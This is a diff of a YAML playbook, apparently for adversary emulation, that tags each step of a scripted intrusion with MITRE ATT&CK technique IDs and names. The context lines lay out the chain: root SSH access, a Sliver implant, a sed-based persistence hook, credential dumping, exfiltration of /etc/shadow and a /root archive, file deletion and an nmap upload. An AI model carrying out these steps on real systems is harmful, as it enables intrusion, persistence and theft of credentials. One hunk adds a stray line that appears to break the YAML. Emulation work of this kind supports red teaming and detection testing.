@@ -23,8 +23,10 @@ commands:
     key_filename: $SSH_KEY
     creates_session: "root"
     metadata:
-      techniques: "T1021"
+      techniques: "T1021.004"
       tactics: "Lateral Movement"
+      technique_name: "Remote Services: SSH"
+
 
   - type: sliver
     cmd: "generate_implant"
@@ -36,8 +38,9 @@ commands:
     host: 0.0.0.0
     port: 443
     metadata:
-      techniques: "T1071,T1573"
+      techniques: "T1071.001,T1573.001"
       tactics: "Command and Control"
+      technique_name: "Application Layer Protocol: Web Protocols,Encrypted Channel: Symmetric Cryptography "
 
   - type: shell
     cmd: ls $IMPLANTPATH
@@ -51,6 +54,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   - type: ssh
     cmd: sed -i 's/#!\/bin\/sh/#!\/bin\/sh\n\/usr\/bin\/zmcontroller \&\n/' /usr/share/awffull/awffull
@@ -58,6 +62,9 @@ commands:
     metadata:
       techniques: "T1547,T1569"
       tactics: "Persistence,Execution"
+      technique_name: "Boot or Logon Autostart Execution,System Services"
+
+      Boot or Logon Autostart Execution 
 
   - type: sliver-session
     cmd: ls
@@ -66,6 +73,7 @@ commands:
     metadata:
       techniques: "T1083"  
       tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
 
   - type: sliver-session
     cmd: ps
@@ -73,6 +81,7 @@ commands:
     metadata:
       techniques: "T1057"
       tactics: "Discovery"
+      technique_name: "Process Discovery"
 
   - type: regex
     cmd: (\d+) .*mariadb
@@ -81,6 +90,7 @@ commands:
     metadata:
      techniques: "T1007"  
      tactics: "Discovery" 
+     technique_name: "System Service Discovery"
 
   - type: debug
     cmd: "$PROCESS"
@@ -96,6 +106,7 @@ commands:
     metadata:
       techniques: "T1003"
       tactics: "Credential Access"
+      technique_name: "OS Credential Dumping"
 
   - type: sliver-session
     cmd: netstat
@@ -103,14 +114,15 @@ commands:
     metadata:
       techniques: "T1049"
       tactics: "Discovery"
+      technique_name: "System Network Connections Discovery"
 
   - type: sliver-session
     cmd: ifconfig
     session: superimplant
     metadata:
-      techniques: "T1082"
+      techniques: "T1016"
       tactics: "Discovery"
-      technique_name: "System Information Discovery"
+      technique_name: "System Network Configuration Discovery"
 
   - type: mktemp
     variable: SHADOW
@@ -121,8 +133,9 @@ commands:
     local_path: $SHADOW
     session: superimplant
     metadata:
-      techniques: "T1552,T1005,T1041"
+      techniques: "T1003.008,T1041"
       tactics: "Credential Access,Collection,Exfiltration"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow,Exfiltration Over C2 Channel"
 
   - type: sliver-session
     cmd: execute
@@ -133,8 +146,9 @@ commands:
       - /root
     session: superimplant
     metadata:
-      techniques: "T1560,T1074,T1005"
+      techniques: "T1560.001,T1074.001"
       tactics: "Collection,Exfiltration"
+      technique_name: "Archive Collected Data: Archive via Utility,Data Staged: Local Data Staging"
 
   - type: mktemp
     variable: ROOTTAR
@@ -150,14 +164,16 @@ commands:
     metadata:
       techniques: "T1041"
       tactics: "Exfiltration"
+      technique_name: "Exfiltration Over C2 Channel"
 
   - type: sliver-session
     cmd: rm
     remote_path: /tmp/r.tar.gz
     session: superimplant
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: sliver-session
     cmd: download
@@ -168,6 +184,7 @@ commands:
     metadata:
       techniques: "T1005"
       tactics: "Collection"
+      technique_name: "Data from Local System"
 
   - type: sliver-session
     cmd: execute
@@ -178,6 +195,7 @@ commands:
     metadata:
       techniques: "T1201"
       tactics: "Discovery"
+      technique_name: "Password Policy Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -186,8 +204,9 @@ commands:
       - /etc/passwd
     session: superimplant
     metadata:
-      techniques: "T1087"
+      techniques: "T1003.008"
       tactics: "Discovery"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
 
   - type: sliver-session
     cmd: execute
@@ -199,6 +218,8 @@ commands:
     metadata:
       techniques: "T1201"
       tactics: "Discovery"
+      technique_name: "Password Policy Discovery"
+
 
   - type: sliver-session
     cmd: upload
@@ -206,8 +227,9 @@ commands:
     remote_path: /tmp/nmap
     session: superimplant
     metadata:
-      techniques: "T1105"
+      techniques: "T1105,T1046,T1018"
       tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer,Network Service Discovery,Remote System Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -217,8 +239,9 @@ commands:
       - /tmp/nmap
     session: superimplant
     metadata:
-      techniques: "T1106"
-      tactics: "Execution"
+      techniques: "T1046,T1018"
+      tactics: "Discovery"
+      technique_name: "Network Service Discovery,Remote System Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -229,4 +252,5 @@ commands:
     metadata:
       techniques: "T1046,T1018"
       tactics: "Discovery"
+      technique_name: "Network Service Discovery,Remote System Discovery"
 
